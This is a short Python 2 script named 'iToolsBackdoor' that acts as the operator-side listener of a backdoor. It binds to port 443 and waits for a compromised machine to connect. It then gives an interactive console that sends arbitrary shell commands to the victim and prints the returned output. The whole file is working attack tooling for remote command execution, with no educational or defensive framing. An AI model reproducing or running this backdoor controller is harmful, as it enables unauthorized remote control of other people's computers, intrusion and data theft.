#!/usr/bin/python
#Code by INDHI FARHANDIKA R
#Aplikasi iToolsBackdoor

import socket,subprocess

PORT = 443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('10.254.107.122', PORT))
s.listen(100)
c,a = s.accept()
print "[+]Connection from:%s\n" % (str(a))
while 1:
    cmd = raw_input("[+]iTConsole >> ")
    if cmd != "exit":
        if cmd == "info":
            print("\t\t\tiTools Backdoor\n\t\t\tVersion 1.0 Alpha")
            print("\t\t   Code by IndhiFarhandika\n")
            continue
        elif cmd == "help":
            print("Code :\ninfo")
            continue
        c.send(cmd)
        result = c.recv(1024)
        tsize = long(result[:16])
        result = result[16:]

        while tsize > len(result):
            data = c.recv(1024)
            result += data
        print result.rstrip("\n")
    else:
        c.send("exit")
        print("[+] Shell Exiting")
        break
s.close()
